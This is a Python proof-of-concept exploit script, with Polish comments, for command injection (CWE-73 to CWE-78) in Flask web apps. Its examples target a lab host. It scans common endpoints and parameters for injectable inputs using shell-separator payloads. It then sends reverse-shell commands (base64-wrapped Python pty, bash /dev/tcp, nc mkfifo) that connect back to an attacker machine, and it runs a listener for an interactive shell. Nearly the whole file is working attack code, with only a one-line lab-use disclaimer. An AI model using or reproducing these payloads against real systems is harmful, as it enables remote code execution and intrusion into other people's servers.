#!/usr/bin/env python3
"""
cwe73poc.py — uniwersalny PoC CWE-73 -> CWE-78 (command injection) dla Flask.

Jeden plik, zero zależności (tylko stdlib).

Tryby:
  --self-test   testy payloadów lokalnie (bez sieci)
  --discover    auto-wykrywa endpoint+parametr i wariant injekcji
  --exploit     wysyła reverse shell na wskazany wektor

Przykłady:
  python3 cwe73poc.py --self-test --lhost 10.10.14.4
  python3 cwe73poc.py --target http://searcher.htb --discover --lhost 10.10.14.4
  python3 cwe73poc.py --target http://searcher.htb --path / --param q \\
      --exploit --mode python --lhost 10.10.14.4 --lport 4444

Tylko do testów na własnej infrastrukturze / labie.
"""
import argparse
import base64
import re
import select
import socket
import sys
import threading
from urllib.error import HTTPError, URLError
from urllib.parse import quote, unquote
from urllib.request import Request, urlopen


# ==========================================================
# 1. PAYLOADY — czyste funkcje
# ==========================================================
MARKER = "PWNED_MARKER_CWE73"


def injection_echo(marker: str = MARKER) -> str:
    return f"*; echo {marker}"


def injection_variants(marker: str = MARKER):
    """Różne sep aratory — różne appki różnie składają string."""
    return [
        f"*; echo {marker}",
        f"* && echo {marker}",
        f"* || echo {marker}",
        f"* | echo {marker}",
        f"* `echo {marker}`",
        f"* $(echo {marker})",
        f"*\n echo {marker}",
        f"; echo {marker}",
    ]


def _b64(code: str) -> str:
    return base64.b64encode(code.encode()).decode()


def reverse_shell_python(host: str, port: int) -> str:
    """Portable: echo <b64> | base64 -d | python3 — bez cudzysłowów w shellu."""
    code = (
        "import socket,os,pty\n"
        "s=socket.socket()\n"
        f"s.connect(('{host}',{port}))\n"
        "os.dup2(s.fileno(),0)\n"
        "os.dup2(s.fileno(),1)\n"
        "os.dup2(s.fileno(),2)\n"
        "pty.spawn('/bin/sh')\n"
    )
    return f"echo {_b64(code)} | base64 -d | python3"


def reverse_shell_python_c(host: str, port: int) -> str:
    """Fallback: python3 -c z urlsafe base64 (bez coreutils `base64`)."""
    code = (
        "import socket,os,pty;"
        "s=socket.socket();"
        f"s.connect(('{host}',{port}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "pty.spawn('/bin/sh')"
    )
    b64 = base64.urlsafe_b64encode(code.encode()).decode().rstrip("=")
    return f"python3 -c \"import base64;exec(base64.urlsafe_b64decode('{b64}==='))\"" 


def reverse_shell_bash(host: str, port: int) -> str:
    """Bash /dev/tcp — wymaga bash + /dev/tcp."""
    return f"bash -c bash -i >& /dev/tcp/{host}/{port} 0>&1"


def reverse_shell_nc(host: str, port: int) -> str:
    """nc mkfifo — gdy jest nc, ale nie ma bash /dev/tcp ani pythona."""
    return (
        "rm -f /tmp/f; mkfifo /tmp/f; "
        f"cat /tmp/f | /bin/sh -i 2>&1 | nc {host} {port} > /tmp/f"
    )


SHELL_MODES = {
    "python":   reverse_shell_python,
    "python_c": reverse_shell_python_c,
    "bash":     reverse_shell_bash,
    "nc":       reverse_shell_nc,
}


def build_shell_cmd(mode: str, host: str, port: int) -> str:
    fn = SHELL_MODES.get(mode)
    if fn is None:
        raise ValueError(f"Nieznany tryb: {mode}. Dozwolone: {list(SHELL_MODES)}")
    return fn(host, port)


def wrap_for_ls(user_input: str, cmd: str) -> str:
    """cmd w tle ('&'), user_input zakończony ';', FD-y przekierowane przez cmd."""
    return f"{user_input}; {cmd} &"


def build_full_payload(host: str, port: int, mode: str = "python") -> str:
    if mode == "echo":
        return injection_echo()
    return wrap_for_ls("*", build_shell_cmd(mode, host, port))


# ==========================================================
# 2. LISTY WYKRYWANIA
# ==========================================================
COMMON_PATHS = [
    "/", "/search", "/query", "/check", "/ping", "/lookup",
    "/dns", "/whois", "/exec", "/run", "/api", "/api/search",
    "/api/query", "/api/check", "/api/ping", "/api/lookup",
    "/api/dns", "/api/whois", "/api/exec", "/api/run",
]

COMMON_PARAMS = [
    "q", "query", "search", "file", "filename", "path", "name",
    "host", "domain", "ip", "address", "url", "target",
    "cmd", "command", "exec", "input", "data", "engine",
]

SKIP_PATHS = ("/favicon.ico", "/static", "/robots.txt", "/health", "/metrics")


# ==========================================================
# 3. HTTP
# ==========================================================
def build_url(target: str, path: str, param: str, payload: str) -> str:
    base = target.rstrip("/")
    if not path.startswith("/"):
        path = "/" + path
    return f"{base}{path}?{param}={quote(payload, safe='')}"


def http_get(url: str, timeout: float = 5.0) -> tuple[int, str, str]:
    """(status, body, final_url); status 0 = błąd sieci."""
    try:
        req = Request(url, headers={"User-Agent": "cwe73poc"})
        with urlopen(req, timeout=timeout) as r:
            return r.status, r.read(200_000).decode(errors="replace"), r.geturl()
    except HTTPError as e:
        body = e.read(200_000).decode(errors="replace") if e.fp else ""
        return e.code, body, getattr(e, "url", url)
    except URLError as e:
        return 0, f"URLError: {e.reason}", url
    except Exception as e:
        return 0, f"{type(e).__name__}: {e}", url


# ==========================================================
# 4. DISCOVERY
# ==========================================================
def probe_baseline(target: str, path: str, param: str) -> bool:
    """Czy endpoint/param w ogóle odpowiada sensownie (nie 404/405/501)."""
    status, _, _ = http_get(build_url(target, path, param, "test123"), timeout=4.0)
    return status not in (0, 404, 405, 501)


def try_injection(target: str, path: str, param: str) -> str | None:
    """Zwraca pierwszy działający wariant injekcji albo None."""
    for v in injection_variants():
        status, body, _ = http_get(build_url(target, path, param, v), timeout=4.0)
        if status and MARKER in body:
            return v
    return None


def discover(target: str, paths: list[str], params: list[str]) -> list[dict]:
    status, body, final = http_get(target + "/", timeout=5.0)
    if status == 0:
        print(f"[!] Target nieosiągalny: {body}")
        return []
    print(f"[*] Target żyje: HTTP {status}, final={final}")

    hits = []
    total = len(paths) * len(params)
    i = 0
    for path in paths:
        if any(path.startswith(s) for s in SKIP_PATHS):
            continue
        for param in params:
            i += 1
            if not probe_baseline(target, path, param):
                continue
            p = try_injection(target, path, param)
            if p:
                print(f"[+] HIT {path}?{param}=  payload={p!r}")
                hits.append({"path": path, "param": param, "payload": p})
            else:
                print(f"[-] {path}?{param}  (baseline ok, brak injekcji)")
    print(f"\n[*] Sprawdzono {i}/{total}, trafień: {len(hits)}")
    return hits


# ==========================================================
# 5. LISTENER + EXPLOIT
# ==========================================================
def start_listener(bind_host: str, bind_port: int) -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((bind_host, bind_port))
    s.listen(1)
    print(f"[*] Listener: {bind_host}:{bind_port}")
    return s


def accept_one(listener: socket.socket, timeout: int):
    listener.settimeout(timeout)
    try:
        conn, addr = listener.accept()
    except socket.timeout:
        print("[!] Timeout — brak połączenia zwrotnego.")
        return None
    print(f"[+] Shell from {addr[0]}:{addr[1]}")
    return conn


def interactive(conn: socket.socket) -> None:
    print("[*] Interactive shell (Ctrl-C aby wyjść)\n")
    try:
        while True:
            r, _, _ = select.select([conn, sys.stdin], [], [])
            if conn in r:
                data = conn.recv(4096)
                if not data:
                    print("\n[!] Połączenie zamknięte.")
                    break
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()
            if sys.stdin in r:
                cmd = sys.stdin.buffer.readline()
                if not cmd:
                    break
                conn.sendall(cmd)
    except KeyboardInterrupt:
        print("\n[*] Zamykam.")
    finally:
        try:
            conn.close()
        except Exception:
            pass


def send_payload_url(url: str, timeout: float = 5.0) -> None:
    print(f"[*] GET {url[:180]}{'...' if len(url) > 180 else ''}")
    status, body, _ = http_get(url, timeout=timeout)
    print(f"[*] HTTP {status} ({len(body)}B)")
    if body:
        print("---- response preview ----")
        print(body[:400])
        print("--------------------------")


def exploit(target: str, path: str, param: str, lhost: str, lport: int,
            mode: str, wait: int) -> int:
    listener = None
    if mode != "echo":
        listener = start_listener("0.0.0.0", lport)

    payload = build_full_payload(lhost, lport, mode)
    print(f"[*] Payload: {payload[:200]}{'...' if len(payload) > 200 else ''}")

    url = build_url(target, path, param, payload)
    t = threading.Thread(target=send_payload_url, args=(url,), daemon=True)
    t.start()

    if listener:
        conn = accept_one(listener, timeout=wait)
        if conn:
            interactive(conn)
        listener.close()
    else:
        t.join(timeout=8)
    return 0


# ==========================================================
# 6. SELF-TEST
# ==========================================================
def self_test(lhost: str, lport: int) -> int:
    print("[*] Self-test payloadów...")
    failures = 0

    for mode in list(SHELL_MODES) + ["echo"]:
        p = build_full_payload(lhost, lport, mode)
        print(f"\n[mode={mode}]")
        print(f"  PAYLOAD: {p[:200]}{'...' if len(p) > 200 else ''}")

        # 1) URL round-trip
        if unquote(quote(p, safe="")) != p:
            print("  [!] URL round-trip psuje payload")
            failures += 1
        else:
            print("  [ok] URL round-trip OK")

        # 2) dla trybów z base64 — compile()
        if mode in ("python", "python_c"):
            if "| base64 -d" in p:
                part = p.split("echo ", 1)[1].split(" | base64 -d", 1)[0].strip()
                try:
                    decoded = base64.b64decode(part).decode()
                except Exception as e:
                    print(f"  [!] base64 decode: {e}")
                    failures += 1
                    continue
            else:
                m = re.search(r"b64decode\('([^']+)'\)", p)
                if not m:
                    print("  [!] brak b64 w payloadzie")
                    failures += 1
                    continue
                raw = m.group(1)
                decoded = base64.urlsafe_b64decode(raw + "=" * (-len(raw) % 4)).decode()

            try:
                compile(decoded, "<payload>", "exec")
                print("  [ok] payload to poprawny Python")
            except SyntaxError as e:
                print(f"  [!] SyntaxError: {e}")
                failures += 1

    print()
    if failures:
        print(f"[!] Self-test: {failures} błędów")
        return 1
    print("[+] Self-test: OK")
    return 0


# ==========================================================
# 7. MAIN
# ==========================================================
def main() -> int:
    ap = argparse.ArgumentParser(
        description="Uniwersalny PoC CWE-73->RCE (Flask, GET query).",
    )
    ap.add_argument("--target", help="np. http://host:5000 albo http://vhost")
    ap.add_argument("--path", help="ścieżka endpointu (dla --exploit)")
    ap.add_argument("--param", help="nazwa parametru (dla --exploit)")
    ap.add_argument("--lhost", required=True, help="IP osiągalne z targetu (NIE 127.0.0.1 przy zdalnym)")
    ap.add_argument("--lport", type=int, default=4444)
    ap.add_argument("--mode", choices=list(SHELL_MODES) + ["echo"], default="python")
    ap.add_argument("--wait", type=int, default=30)

    g = ap.add_mutually_exclusive_group(required=False)
    g.add_argument("--discover", action="store_true")
    g.add_argument("--exploit", action="store_true")
    g.add_argument("--self-test", action="store_true")

    ap.add_argument("--paths", nargs="*", default=None)
    ap.add_argument("--params", nargs="*", default=None)

    args = ap.parse_args()

    if args.self_test:
        return self_test(args.lhost, args.lport)

    if not args.target:
        print("[!] --target wymagane (albo --self-test)")
        return 2

    if args.discover:
        hits = discover(args.target, args.paths or COMMON_PATHS, args.params or COMMON_PARAMS)
        if not hits:
            print("[!] Brak trafień. Spróbuj: --paths ... --params ...")
            return 1
        print("\n=== TRAFIENIA ===")
        for h in hits:
            print(f"  {h['path']}?{h['param']}=")
        print("\nExploit:")
        for h in hits:
            print(f"  python3 {sys.argv[0]} --target {args.target} "
                  f"--path {h['path']} --param {h['param']} "
                  f"--exploit --mode python --lhost {args.lhost} --lport {args.lport}")
        return 0

    if args.exploit:
        if not (args.path and args.param):
            print("[!] --exploit wymaga --path i --param")
            return 2
        return exploit(args.target, args.path, args.param, args.lhost,
                       args.lport, args.mode, args.wait)

    print("[!] Wybierz --discover, --exploit albo --self-test")
    return 2


if __name__ == "__main__":
    sys.exit(main())
